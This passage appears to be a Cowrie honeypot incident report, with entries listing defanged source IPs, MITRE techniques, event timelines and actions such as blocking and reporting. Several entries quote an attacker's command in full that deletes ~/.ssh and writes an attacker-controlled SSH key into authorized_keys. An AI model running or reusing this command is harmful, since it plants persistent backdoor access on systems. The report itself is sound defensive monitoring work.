| `2026-04-08 21:07:46` | `cowrie.client.kex` |
| `2026-04-08 21:07:46` | `cowrie.login.success` |
| `2026-04-08 21:07:47` | `cowrie.session.params` |
| `2026-04-08 21:07:47` | `cowrie.command.input` |
| `2026-04-08 21:07:47` | `cowrie.command.failed` |
| `2026-04-08 21:07:47` | `cowrie.log.closed` |
| `2026-04-08 21:07:47` | `cowrie.session.params` |
| `2026-04-08 21:07:47` | `cowrie.command.input` |
| `2026-04-08 21:07:47` | `cowrie.session.file_download` |
| `2026-04-08 21:07:47` | `cowrie.log.closed` |
| `2026-04-08 21:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861426bbe743

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:07 |
| **Last Seen** | 2026-04-08 21:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:07:49` | `cowrie.session.connect` |
| `2026-04-08 21:07:49` | `cowrie.client.version` |
| `2026-04-08 21:07:49` | `cowrie.client.kex` |
| `2026-04-08 21:07:50` | `cowrie.login.success` |
| `2026-04-08 21:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dddebd32257

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:10 |
| **Last Seen** | 2026-04-08 21:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:10:41` | `cowrie.session.connect` |
| `2026-04-08 21:10:41` | `cowrie.client.version` |
| `2026-04-08 21:10:41` | `cowrie.client.kex` |
| `2026-04-08 21:10:42` | `cowrie.login.success` |
| `2026-04-08 21:10:42` | `cowrie.session.params` |
| `2026-04-08 21:10:42` | `cowrie.command.input` |
| `2026-04-08 21:10:42` | `cowrie.command.failed` |
| `2026-04-08 21:10:42` | `cowrie.log.closed` |
| `2026-04-08 21:10:42` | `cowrie.session.params` |
| `2026-04-08 21:10:42` | `cowrie.command.input` |
| `2026-04-08 21:10:43` | `cowrie.session.file_download` |
| `2026-04-08 21:10:43` | `cowrie.log.closed` |
| `2026-04-08 21:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41249a1ba5b4

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:10 |
| **Last Seen** | 2026-04-08 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:10:45` | `cowrie.session.connect` |
| `2026-04-08 21:10:45` | `cowrie.client.version` |
| `2026-04-08 21:10:45` | `cowrie.client.kex` |
| `2026-04-08 21:10:45` | `cowrie.login.success` |
| `2026-04-08 21:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d983bb49efe

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:16 |
| **Last Seen** | 2026-04-08 21:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:16:28` | `cowrie.session.connect` |
| `2026-04-08 21:16:28` | `cowrie.client.version` |
| `2026-04-08 21:16:28` | `cowrie.client.kex` |
| `2026-04-08 21:16:29` | `cowrie.login.success` |
| `2026-04-08 21:16:29` | `cowrie.session.params` |
| `2026-04-08 21:16:29` | `cowrie.command.input` |
| `2026-04-08 21:16:29` | `cowrie.command.failed` |
| `2026-04-08 21:16:29` | `cowrie.log.closed` |
| `2026-04-08 21:16:30` | `cowrie.session.params` |
| `2026-04-08 21:16:30` | `cowrie.command.input` |
| `2026-04-08 21:16:30` | `cowrie.session.file_download` |
| `2026-04-08 21:16:30` | `cowrie.log.closed` |
| `2026-04-08 21:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64bc470cebc5

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:16 |
| **Last Seen** | 2026-04-08 21:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:16:32` | `cowrie.session.connect` |
| `2026-04-08 21:16:32` | `cowrie.client.version` |
| `2026-04-08 21:16:32` | `cowrie.client.kex` |
| `2026-04-08 21:16:33` | `cowrie.login.success` |
| `2026-04-08 21:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e0d4cc07e1

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:17 |
| **Last Seen** | 2026-04-08 21:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:17:51` | `cowrie.session.connect` |
| `2026-04-08 21:17:51` | `cowrie.client.version` |
| `2026-04-08 21:17:51` | `cowrie.client.kex` |
| `2026-04-08 21:17:52` | `cowrie.login.success` |
| `2026-04-08 21:17:52` | `cowrie.session.params` |
| `2026-04-08 21:17:52` | `cowrie.command.input` |
| `2026-04-08 21:17:52` | `cowrie.command.failed` |
| `2026-04-08 21:17:52` | `cowrie.log.closed` |
| `2026-04-08 21:17:52` | `cowrie.session.params` |
| `2026-04-08 21:17:52` | `cowrie.command.input` |
| `2026-04-08 21:17:53` | `cowrie.session.file_download` |
| `2026-04-08 21:17:53` | `cowrie.log.closed` |
| `2026-04-08 21:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce6c80dd621

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:17 |
| **Last Seen** | 2026-04-08 21:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:17:55` | `cowrie.session.connect` |
| `2026-04-08 21:17:55` | `cowrie.client.version` |
| `2026-04-08 21:17:55` | `cowrie.client.kex` |
| `2026-04-08 21:17:55` | `cowrie.login.success` |
| `2026-04-08 21:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6bbd1ed9d49

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:19 |
| **Last Seen** | 2026-04-08 21:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:19:13` | `cowrie.session.connect` |
| `2026-04-08 21:19:13` | `cowrie.client.version` |
| `2026-04-08 21:19:13` | `cowrie.client.kex` |
| `2026-04-08 21:19:14` | `cowrie.login.success` |
| `2026-04-08 21:19:14` | `cowrie.session.params` |
| `2026-04-08 21:19:14` | `cowrie.command.input` |
| `2026-04-08 21:19:14` | `cowrie.command.failed` |
| `2026-04-08 21:19:14` | `cowrie.log.closed` |
| `2026-04-08 21:19:15` | `cowrie.session.params` |
| `2026-04-08 21:19:15` | `cowrie.command.input` |
| `2026-04-08 21:19:15` | `cowrie.session.file_download` |
| `2026-04-08 21:19:15` | `cowrie.log.closed` |
| `2026-04-08 21:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab11ec1a4b58

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:19 |
| **Last Seen** | 2026-04-08 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:19:17` | `cowrie.session.connect` |
| `2026-04-08 21:19:17` | `cowrie.client.version` |
| `2026-04-08 21:19:17` | `cowrie.client.kex` |
| `2026-04-08 21:19:18` | `cowrie.login.success` |
| `2026-04-08 21:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7c91e52b2a

| Field | Detail |
|---|---|
| **Source IP** | `52.187.9[.]8` |
| **First Seen** | 2026-04-08 22:24 |
| **Last Seen** | 2026-04-08 22:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:24:13` | `cowrie.session.connect` |
| `2026-04-08 22:24:13` | `cowrie.client.version` |
| `2026-04-08 22:24:13` | `cowrie.client.kex` |
| `2026-04-08 22:24:13` | `cowrie.login.success` |
| `2026-04-08 22:24:13` | `cowrie.session.params` |
| `2026-04-08 22:24:13` | `cowrie.command.input` |
| `2026-04-08 22:24:13` | `cowrie.command.failed` |
| `2026-04-08 22:24:13` | `cowrie.log.closed` |
| `2026-04-08 22:24:13` | `cowrie.session.params` |
| `2026-04-08 22:24:13` | `cowrie.command.input` |
| `2026-04-08 22:24:13` | `cowrie.session.file_download` |
| `2026-04-08 22:24:13` | `cowrie.log.closed` |
| `2026-04-08 22:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.187.9[.]8` to AbuseIPDB if not already reported
- [ ] Block `52.187.9[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ec9c31125f

| Field | Detail |
|---|---|
| **Source IP** | `52.187.9[.]8` |
| **First Seen** | 2026-04-08 22:24 |
| **Last Seen** | 2026-04-08 22:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:24:15` | `cowrie.session.connect` |
| `2026-04-08 22:24:15` | `cowrie.client.version` |
| `2026-04-08 22:24:15` | `cowrie.client.kex` |
| `2026-04-08 22:24:15` | `cowrie.login.success` |
| `2026-04-08 22:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.187.9[.]8` to AbuseIPDB if not already reported
- [ ] Block `52.187.9[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5228b57eb6e

| Field | Detail |
|---|---|
| **Source IP** | `39.117.79[.]36` |
| **First Seen** | 2026-04-08 22:25 |
| **Last Seen** | 2026-04-08 22:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:25:46` | `cowrie.session.connect` |
| `2026-04-08 22:25:46` | `cowrie.client.version` |
| `2026-04-08 22:25:46` | `cowrie.client.kex` |
| `2026-04-08 22:25:46` | `cowrie.login.success` |
| `2026-04-08 22:25:47` | `cowrie.session.params` |
| `2026-04-08 22:25:47` | `cowrie.command.input` |
| `2026-04-08 22:25:47` | `cowrie.command.failed` |
| `2026-04-08 22:25:47` | `cowrie.log.closed` |
| `2026-04-08 22:25:47` | `cowrie.session.params` |
| `2026-04-08 22:25:47` | `cowrie.command.input` |
| `2026-04-08 22:25:47` | `cowrie.session.file_download` |
| `2026-04-08 22:25:47` | `cowrie.log.closed` |
| `2026-04-08 22:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.117.79[.]36` to AbuseIPDB if not already reported
- [ ] Block `39.117.79[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-636841d03ee5

| Field | Detail |
|---|---|
| **Source IP** | `39.117.79[.]36` |
| **First Seen** | 2026-04-08 22:25 |
| **Last Seen** | 2026-04-08 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:25:49` | `cowrie.session.connect` |
| `2026-04-08 22:25:49` | `cowrie.client.version` |
| `2026-04-08 22:25:49` | `cowrie.client.kex` |
| `2026-04-08 22:25:50` | `cowrie.login.success` |
| `2026-04-08 22:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.117.79[.]36` to AbuseIPDB if not already reported
- [ ] Block `39.117.79[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8925f1ac6e50

| Field | Detail |
|---|---|
| **Source IP** | `36.104.147[.]6` |
| **First Seen** | 2026-04-08 22:26 |
| **Last Seen** | 2026-04-08 22:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:26:22` | `cowrie.session.connect` |
| `2026-04-08 22:26:22` | `cowrie.client.version` |
| `2026-04-08 22:26:22` | `cowrie.client.kex` |
| `2026-04-08 22:26:23` | `cowrie.login.success` |
| `2026-04-08 22:26:23` | `cowrie.session.params` |
| `2026-04-08 22:26:23` | `cowrie.command.input` |
| `2026-04-08 22:26:23` | `cowrie.command.failed` |
| `2026-04-08 22:26:23` | `cowrie.log.closed` |
| `2026-04-08 22:26:24` | `cowrie.session.params` |
| `2026-04-08 22:26:24` | `cowrie.command.input` |
| `2026-04-08 22:26:24` | `cowrie.session.file_download` |
| `2026-04-08 22:26:24` | `cowrie.log.closed` |
| `2026-04-08 22:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.104.147[.]6` to AbuseIPDB if not already reported
- [ ] Block `36.104.147[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427d34a9ce99

| Field | Detail |
|---|---|
| **Source IP** | `36.104.147[.]6` |
| **First Seen** | 2026-04-08 22:26 |
| **Last Seen** | 2026-04-08 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:26:26` | `cowrie.session.connect` |
| `2026-04-08 22:26:26` | `cowrie.client.version` |
| `2026-04-08 22:26:26` | `cowrie.client.kex` |
| `2026-04-08 22:26:27` | `cowrie.login.success` |
| `2026-04-08 22:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.104.147[.]6` to AbuseIPDB if not already reported
- [ ] Block `36.104.147[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37885d3a61fc

| Field | Detail |
|---|---|
| **Source IP** | `185.227.153[.]14` |
| **First Seen** | 2026-04-08 22:28 |
| **Last Seen** | 2026-04-08 22:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:28:32` | `cowrie.session.connect` |
| `2026-04-08 22:28:32` | `cowrie.client.version` |
| `2026-04-08 22:28:33` | `cowrie.client.kex` |
| `2026-04-08 22:28:33` | `cowrie.login.success` |
| `2026-04-08 22:28:33` | `cowrie.session.params` |
| `2026-04-08 22:28:33` | `cowrie.command.input` |
| `2026-04-08 22:28:33` | `cowrie.command.failed` |
| `2026-04-08 22:28:33` | `cowrie.log.closed` |
| `2026-04-08 22:28:33` | `cowrie.session.params` |
| `2026-04-08 22:28:33` | `cowrie.command.input` |
| `2026-04-08 22:28:33` | `cowrie.session.file_download` |
| `2026-04-08 22:28:33` | `cowrie.log.closed` |
| `2026-04-08 22:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.227.153[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.227.153[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b8fd117fa9

| Field | Detail |
|---|---|
| **Source IP** | `185.227.153[.]14` |
| **First Seen** | 2026-04-08 22:28 |
| **Last Seen** | 2026-04-08 22:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:28:35` | `cowrie.session.connect` |
| `2026-04-08 22:28:35` | `cowrie.client.version` |
| `2026-04-08 22:28:35` | `cowrie.client.kex` |
| `2026-04-08 22:28:36` | `cowrie.login.success` |
| `2026-04-08 22:28:36` | `cowrie.session.closed` |

